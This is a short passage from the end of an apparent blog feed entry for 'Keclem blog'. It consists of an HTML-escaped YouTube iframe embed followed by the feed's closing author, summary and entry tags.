+&lt;div class=&quot;embed&quot;&gt;&lt;iframe src=&quot;https://www.youtube.com/embed/_C0A5zX-iqM&quot; frameborder=&quot;0&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;&lt;/div&gt;</content><author><name>Keclem blog</name></author><summary type="html">MathJax</summary></entry></feed>
